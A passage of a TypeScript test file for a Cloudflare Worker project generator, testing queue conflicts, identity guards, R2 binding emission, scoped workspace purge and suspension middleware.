    expect(entry).toContain('import { handleSweepA, handleSweepB } from "@x/sched-brick";');
    expect(entry).toContain('import { consumeAlpha, consumeBeta } from "@x/queue-brick";');
    expect(entry).toContain("FROM px_schedules WHERE active = 1 AND datetime(next_run_at) <= datetime(?)");
    expect(entry).toContain("AND next_run_at = ?");
    expect(entry).toContain('case "alpha-jobs":');
    expect(entry).toContain('case "beta-jobs":');
    expect(entry).toContain("fetch: app.fetch,");
    expect(entry).toContain("scheduled,");
    expect(entry).toContain("queue,");
  });

  test("refuses two bricks that declare the same queue id", () => {
    const c = catalogOf(
      brick("left", { triggers: { queues: [{ id: "shared-q", handler: "runLeft", maxBatch: 10, dlq: true }] } }),
      brick("right", { triggers: { queues: [{ id: "shared-q", handler: "runRight", maxBatch: 10, dlq: true }] } }),
    );
    expect(errors({ project: "p", bricks: ["left", "right"] }, c)).toEqual([
      'queue "shared-q" is declared by both left and right; enable only one',
    ]);
  });

  test("pluggable identity mounts core-auth sessionMiddleware or any custom user-identity brick guard, and refuses invalid identity configs", () => {
    const coreAuthOut = files({
      project: "authed-app",
      identity: "core-auth",
      bricks: ["multi-workspace", "core-auth"],
    });
    expect(coreAuthOut.files["src/identity.stub.ts"]).toBeUndefined();
    expect(coreAuthOut.files["src/index.ts"]).not.toContain("stubIdentity");
    expect(coreAuthOut.files["src/index.ts"]).toContain('import { createAuthRoutes, sessionMiddleware } from "@poc/core-auth";');
    expect(coreAuthOut.files["src/index.ts"]).toContain('app.use("/api/*", sessionMiddleware);');
    expect(JSON.parse(coreAuthOut.files["project.json"]!).identity).toBe("core-auth");

    // Refuses identity: "core-auth" when core-auth is not enabled in bricks
    expect(
      errors({
        project: "authed-app",
        identity: "core-auth",
        bricks: ["multi-workspace"],
      }),
    ).toEqual(['identity "core-auth" requires brick "core-auth" to be enabled in bricks']);

    // Refuses an enabled brick that does not provide user-identity
    expect(
      errors({
        project: "authed-app",
        identity: "multi-workspace",
        bricks: ["multi-workspace"],
      }),
    ).toEqual(['identity "multi-workspace" does not provide "user-identity"']);

    // Supports any custom brick that provides user-identity and declares a worker.guard (D8)
    const customCatalog = catalogOf(
      brick("custom-auth", {
        provides: ["user-identity"],
        worker: {
          package: "@x/custom-auth",
          guard: { export: "customAuthGuard", capability: "user-identity" },
          routes: [{ factory: "createCustomAuthRoutes", mountAt: "/api", options: {}, guardPaths: [] }],
        },
      }),
    );
    const customOut = files({ project: "custom-app", identity: "custom-auth", bricks: ["custom-auth"] }, customCatalog);
    expect(customOut.files["src/index.ts"]).toContain('import { createCustomAuthRoutes, customAuthGuard } from "@x/custom-auth";');
    expect(customOut.files["src/index.ts"]).toContain('app.use("/api/*", customAuthGuard);');
  });
});

describe("conditional INTEGRATION_BLOBS R2 binding emission (AC4)", () => {
  const binaryCatalog: Catalog = {
    ...catalog,
    integrations: {
      ...catalog.integrations,
      storage: {
        manifest: {
          app: "storage",
          name: "Storage Service",
          version: "1.0.0",
          operations: [
            {
              operationId: "downloadPdf",
              description: "Download PDF",
              method: "GET",
              path: "/files/pdf",
              response: { binary: true, contentType: "application/pdf" },
            },
            {
              operationId: "uploadMultipart",
              description: "Upload file",
              method: "POST",
              path: "/files/upload",
              body: { contentType: "multipart/form-data" },
            },
            {
              operationId: "uploadStream",
              description: "Stream octet",
              method: "POST",
              path: "/files/stream",
              body: { contentType: "application/octet-stream" },
            },
            {
              operationId: "getJsonData",
              description: "Get JSON data",
              method: "GET",
              path: "/files/meta",
              response: { binary: false, contentType: "application/json" },
            },
          ],
        } as any,
        nodes: [],
      },
    },
  };

  test("emits INTEGRATION_BLOBS R2 bucket binding in wrangler.jsonc when graph has binary response operation", () => {
    const bp = {
      project: "proj-binary-res",
      bricks: ["multi-workspace"],
      workflows: [
        {
          id: "wf-download",
          name: "Download Workflow",
          nodes: [
            {
              id: "step1",
              type: "int:storage.downloadPdf",
              data: { operationId: "downloadPdf" },
            },
          ],
        },
      ],
    };
    const res = files(bp, binaryCatalog);
    const wrangler = JSON.parse(res.files["wrangler.jsonc"]!.replace(/^\/\/.*\n/, ""));
    expect(wrangler.r2_buckets).toEqual([
      { binding: "INTEGRATION_BLOBS", bucket_name: "proj-binary-res-blobs" },
    ]);
  });

  test("emits INTEGRATION_BLOBS R2 bucket binding in wrangler.jsonc when graph has binary request content-type", () => {
    const bp = {
      project: "proj-binary-req",
      bricks: ["multi-workspace"],
      workflows: [
        {
          id: "wf-upload",
          name: "Upload Workflow",
          nodes: [
            {
              id: "step1",
              type: "int:storage.uploadMultipart",
              data: { operationId: "uploadMultipart" },
            },
          ],
        },
      ],
    };
    const res = files(bp, binaryCatalog);
    const wrangler = JSON.parse(res.files["wrangler.jsonc"]!.replace(/^\/\/.*\n/, ""));
    expect(wrangler.r2_buckets).toEqual([
      { binding: "INTEGRATION_BLOBS", bucket_name: "proj-binary-req-blobs" },
    ]);
  });

  test("omits r2_buckets and INTEGRATION_BLOBS from wrangler.jsonc when graph has only non-binary operations", () => {
    const bp = {
      project: "proj-non-binary",
      bricks: ["multi-workspace"],
      workflows: [
        {
          id: "wf-meta",
          name: "Meta Workflow",
          nodes: [
            {
              id: "step1",
              type: "int:storage.getJsonData",
              data: { operationId: "getJsonData" },
            },
          ],
        },
      ],
    };
    const res = files(bp, binaryCatalog);
    const wrangler = JSON.parse(res.files["wrangler.jsonc"]!.replace(/^\/\/.*\n/, ""));
    expect(wrangler.r2_buckets).toBeUndefined();
    expect(res.files["wrangler.jsonc"]).not.toContain("INTEGRATION_BLOBS");
  });

  test("omits r2_buckets and INTEGRATION_BLOBS from wrangler.jsonc when blueprint has no workflows", () => {
    const bp = {
      project: "proj-no-wf",
      bricks: ["multi-workspace"],
    };
    const res = files(bp, binaryCatalog);
    const wrangler = JSON.parse(res.files["wrangler.jsonc"]!.replace(/^\/\/.*\n/, ""));
    expect(wrangler.r2_buckets).toBeUndefined();
    expect(res.files["wrangler.jsonc"]).not.toContain("INTEGRATION_BLOBS");
  });
});


describe("story 1.10: workspace delete cascade and suspension enforcement", () => {
  const ws = (guard: Record<string, unknown> = { suspension: "refuseSuspended" }, extra: Partial<Catalog["bricks"][string]["manifest"]> = {}) =>
    brick("ws-brick", {
      provides: ["workspace-context"],
      worker: {
        package: "@x/ws-brick",
        guard: { export: "wsGuard", capability: "workspace-context", ...guard },
        routes: [{ factory: "createWs", mountAt: "/api", options: { purge: { $workspaceData: "purgeWorkspaceData" } }, guardPaths: [] }],
      },
      ...extra,
    });
  const notesSql = [
    "CREATE TABLE IF NOT EXISTS notes (id TEXT PRIMARY KEY, workspace_id TEXT NOT NULL);",
    "CREATE TABLE IF NOT EXISTS note_tags (id TEXT PRIMARY KEY, workspace_id TEXT NOT NULL, note_id TEXT REFERENCES notes(id));",
    "CREATE TABLE IF NOT EXISTS note_audit (id TEXT PRIMARY KEY, workspace_id TEXT NOT NULL);",
    "CREATE TABLE IF NOT EXISTS note_trash (id TEXT PRIMARY KEY, workspace_id TEXT NOT NULL, deleted_at TEXT);",
    "CREATE TABLE IF NOT EXISTS note_kinds (id TEXT PRIMARY KEY);",
  ].join("\n");
  const notes = (
    workspaceData: NonNullable<Catalog["bricks"][string]["manifest"]["workspaceData"]>,
    extra: Partial<Catalog["bricks"][string]["manifest"]> = {},
  ) =>
    brick(
      "notes-brick",
      {
        requires: ["workspace-context"],
        routePrefixes: ["notes"],
        migrations: ["migrations/0001.sql"],
        globalTables: [{ table: "note_kinds", reason: "Shared list of kinds." }],
        privacy: { tables: {}, hookTables: ["notes", "note_tags", "note_audit", "note_trash"] },
        workspaceData,
        worker: { package: "@x/notes-brick", routes: [{ factory: "createNotes", mountAt: "/api", options: {}, guardWith: "workspace-context", guardPaths: ["/api/notes", "/api/notes/*"] }] },
        ...extra,
      },
      { "migrations/0001.sql": notesSql },
    );
  const both = ["ws-brick", "notes-brick"];

  test("the purge lists every declared table in reverse install order, tombstones by deleted_at, and never a global table", () => {
    const c = catalogOf(ws(), notes({ tables: [{ table: "notes" }, { table: "note_audit", tombstone: true }, { table: "note_trash", tombstone: true }, { table: "note_tags" }] }));
    const entry = files({ project: "p", bricks: both }, c).files["src/index.ts"]!;
    const sql = /const WORKSPACE_PURGE_SQL: ReadonlyArray<string> = (\[[\s\S]*?\]);/.exec(entry)?.[1];
    expect(JSON.parse(sql!)).toEqual([
      'UPDATE "note_trash" SET deleted_at = datetime(\'now\') WHERE workspace_id = ? AND deleted_at IS NULL',
      'DELETE FROM "note_tags" WHERE workspace_id = ?',
      'DELETE FROM "notes" WHERE workspace_id = ?',
    ]);
    expect(entry).toContain("// Kept for audit (tombstone tables without a deleted_at column): note_audit.");
    expect(entry).not.toContain('"note_kinds"');
    expect(entry).toContain("createWs({ purge: purgeWorkspaceData })");
    expect(entry).toContain("WORKSPACE_PURGE_SQL.slice(i, i + 25)");
  });

  test("px_schedules is purged when the shell table is emitted, and object prefixes are listed with their binding", () => {
    const c = catalogOf(
      ws(),
      notes(
        { tables: [{ table: "notes" }], objectPrefixes: [{ binding: "FILES", prefix: "ws/{workspaceId}/notes/" }] },
        { bindings: { FILES: "r2" }, triggers: { schedules: [{ id: "tick", cron: "* * * * *", handler: "onTick" }] } },
      ),
    );
    const entry = files({ project: "p", bricks: both }, c).files["src/index.ts"]!;
    const sql = JSON.parse(/const WORKSPACE_PURGE_SQL: ReadonlyArray<string> = (\[[\s\S]*?\]);/.exec(entry)![1]!);
    expect(sql[0]).toBe('DELETE FROM "px_schedules" WHERE workspace_id = ?');
    expect(entry).toContain('const WORKSPACE_PURGE_OBJECTS: ReadonlyArray<{ binding: string; prefix: string }> = [{"binding":"FILES","prefix":"ws/{workspaceId}/notes/"}];');
    // Without schedules there is no px_schedules statement.
    const plain = files({ project: "p", bricks: both }, catalogOf(ws(), notes({ tables: [{ table: "notes" }] }))).files["src/index.ts"]!;
    expect(plain).not.toContain("px_schedules");
  });

  test("a bad declaration is refused: a table not created, without workspace_id, an undeclared binding, a prefix that is not one workspace's", async () => {
    expect(errors({ project: "p", bricks: both }, catalogOf(ws(), notes({ tables: [{ table: "ghost" }] })))).toEqual([
      'notes-brick declares workspaceData table "ghost", which its migrations do not create',
    ]);
    expect(errors({ project: "p", bricks: both }, catalogOf(ws(), notes({ tables: [{ table: "note_kinds" }] })))).toEqual([
      'notes-brick declares workspaceData table "note_kinds", which has no workspace_id column',
    ]);
    expect(errors({ project: "p", bricks: both }, catalogOf(ws(), notes({ tables: [], objectPrefixes: [{ binding: "FILES", prefix: "ws/{workspaceId}/" }] })))).toEqual([
      'notes-brick declares workspaceData objects in binding "FILES", which is not an R2 binding in its bindings',
    ]);
    // A binding of another type (a KV namespace here) is refused too: R2 is the only store listed and deleted by prefix.
    const kv = notes({ tables: [], objectPrefixes: [{ binding: "FILES", prefix: "ws/{workspaceId}/" }] }, { bindings: { FILES: "kv" } });
    expect(errors({ project: "p", bricks: both }, catalogOf(ws(), kv))).toEqual([
      'notes-brick declares workspaceData objects in binding "FILES", which is not an R2 binding in its bindings',
    ]);
    const { ManifestSchema } = await import("../src/schemas.ts");
    const withPrefix = (prefix: string) =>
      ManifestSchema.safeParse({ ...notes({ tables: [], objectPrefixes: [{ binding: "FILES", prefix }] }).manifest, bindings: { FILES: "r2" } }).success;
    expect(withPrefix("ws/{workspaceId}/notes/")).toBe(true);
    expect(withPrefix("ws/{workspaceId}")).toBe(false);
    expect(withPrefix("ws/")).toBe(false);
    expect(withPrefix("{workspaceId}/x/")).toBe(false);
    // The schema (and so catalog:conformance) refuses a binding that is not declared as R2.
    const issues = (bindings: unknown) =>
      ManifestSchema.safeParse({ ...notes({ tables: [], objectPrefixes: [{ binding: "FILES", prefix: "ws/{workspaceId}/" }] }).manifest, bindings }).error?.issues.map((i) => i.message) ?? [];
    expect(issues({ FILES: "r2" })).toEqual([]);
    for (const bindings of [{ FILES: "kv" }, ["FILES"], undefined]) {
      expect(issues(bindings)).toContain('workspaceData objectPrefixes binding "FILES" must be declared as an R2 binding ("r2") in bindings');
    }
  });

  test("the generated purge pages through the bucket, deletes only the workspace's keys, and refuses an id with a slash before any delete", async () => {
    const ts = (await import("typescript")).default;
    const c = catalogOf(ws(), notes({ tables: [{ table: "notes" }], objectPrefixes: [{ binding: "FILES", prefix: "ws/{workspaceId}/notes/" }] }, { bindings: { FILES: "r2" } }));
    const entry = files({ project: "p", bricks: both }, c).files["src/index.ts"]!;
    const start = entry.indexOf("const WORKSPACE_PURGE_SQL");
    const end = entry.indexOf("\n}\n", entry.indexOf("async function purgeWorkspaceData")) + 3;
    const js = ts.transpileModule(`function make() {\n${entry.slice(start, end)}\nreturn purgeWorkspaceData;\n}`, {
      compilerOptions: { target: ts.ScriptTarget.ES2022 },
    }).outputText;
    const purge = new Function(`${js}\nreturn make();`)() as (env: Record<string, unknown>, workspaceId: string) => Promise<void>;

    const keys = new Set([
      ...[1, 2, 3, 4, 5].map((n) => `ws/wsA/notes/${n}`),
      "ws/wsA2/notes/1",
      "ws/wsB/notes/1",
      "ws/wsA/other/1",
    ]);
    const lists: Array<{ prefix: string; cursor?: string }> = [];
    const bucket = {
      async list(o: { prefix: string; cursor?: string }) {
        lists.push(o);
        const all = [...keys].filter((k) => k.startsWith(o.prefix)).sort();
        const from = o.cursor ? Number(o.cursor) : 0;
        const page = all.slice(from, from + 2);
        const truncated = from + 2 < all.length;
        return { objects: page.map((key) => ({ key })), truncated, ...(truncated ? { cursor: String(from + 2) } : {}) };
      },
      async delete(ks: string[]) {
        // Deleting does not shift the fake's cursor (a cursor names a position in the original listing).
        for (const k of ks) deleted.push(k);
      },
    };
    const deleted: string[] = [];
    const batches: string[][] = [];
    const db = {
      prepare: (sql: string) => ({ bind: (id: string) => `${sql} [${id}]` }),
      batch: async (statements: string[]) => {
        batches.push(statements);
        return [];
      },
    };

    await purge({ DB: db, FILES: bucket }, "wsA");
    expect(deleted.sort()).toEqual([1, 2, 3, 4, 5].map((n) => `ws/wsA/notes/${n}`));
    expect(lists).toEqual([{ prefix: "ws/wsA/notes/" }, { prefix: "ws/wsA/notes/", cursor: "2" }, { prefix: "ws/wsA/notes/", cursor: "4" }]);
    expect(batches).toEqual([['DELETE FROM "notes" WHERE workspace_id = ? [wsA]']]);

    deleted.length = 0;
    batches.length = 0;
    lists.length = 0;
    for (const bad of ["ws/A", "wsA/", "", "a".repeat(65)]) {
      await expect(purge({ DB: db, FILES: bucket }, bad)).rejects.toThrow("invalid workspace id");
    }
    expect(lists).toEqual([]);
    expect(deleted).toEqual([]);
    expect(batches).toEqual([]);
  });

  test("each guard's own suspension check is mounted right after it on every guarded path", () => {
    const entry = files({ project: "p", bricks: both }, catalogOf(ws(), notes({ tables: [{ table: "notes" }] }))).files["src/index.ts"]!;
    for (const path of ["/api/notes", "/api/notes/*"]) expect(entry).toContain(`app.use("${path}", wsGuard);\napp.use("${path}", notSuspended_workspace_context);`);
    expect(entry).toContain('import { createWs, refuseSuspended, wsGuard } from "@x/ws-brick";');
    expect(entry).toContain("const notSuspended_workspace_context = (c: any, next: any) => (suspensionExempt(c) ? next() : refuseSuspended(c, next));");
    for (const e of SUSPENSION_EXEMPT) expect(entry).toContain(`  // ${e.method} ${e.path}: ${e.reason}`);

    // A second guard capability gets its own check, wrapping its own suspension export.
    const other = brick("org-brick", {
      provides: ["org-context"],
      worker: { package: "@x/org-brick", guard: { export: "orgGuard", capability: "org-context", suspension: "refuseFrozenOrg" }, routes: [] },
    });
    const orgRoutes = brick("org-things", {
      requires: ["org-context"],
      routePrefixes: ["orgs"],
      worker: { package: "@x/org-things", routes: [{ factory: "createOrgThings", mountAt: "/api", options: {}, guardWith: "org-context", guardPaths: ["/api/orgs/*"] }] },
    });
    const two = files({ project: "p", bricks: [...both, "org-brick", "org-things"] }, catalogOf(ws(), notes({ tables: [{ table: "notes" }] }), other, orgRoutes)).files["src/index.ts"]!;
    expect(two).toContain('app.use("/api/orgs/*", orgGuard);\napp.use("/api/orgs/*", notSuspended_org_context);');
    expect(two).toContain("const notSuspended_org_context = (c: any, next: any) => (suspensionExempt(c) ? next() : refuseFrozenOrg(c, next));");
    expect(two).toContain('app.use("/api/notes/*", wsGuard);\napp.use("/api/notes/*", notSuspended_workspace_context);');

    // A guard without a suspension export mounts no check.
    const plain = catalogOf(ws({}), notes({ tables: [{ table: "notes" }] }));
    expect(files({ project: "p", bricks: both }, plain).files["src/index.ts"]).not.toContain("notSuspended");
  });

  test("the allowlist matches on method and exact path shape only", () => {
    const exempt = (method: string, path: string) => SUSPENSION_EXEMPT.some((e) => e.method === method && new RegExp(exemptPathPattern(e.path)).test(path));
    expect(exempt("POST", "/api/privacy/export")).toBe(true);
    expect(exempt("GET", "/api/privacy/erasure/req-1")).toBe(true);
    expect(exempt("GET", "/api/privacy/export")).toBe(false);
    expect(exempt("POST", "/api/privacy/consents")).toBe(false);
    expect(exempt("DELETE", "/api/privacy/workspace")).toBe(false);
    expect(exempt("GET", "/api/privacy/erasure/req-1/extra")).toBe(false);
    expect(exempt("POST", "/api/privacy/exportx")).toBe(false);
  });
});
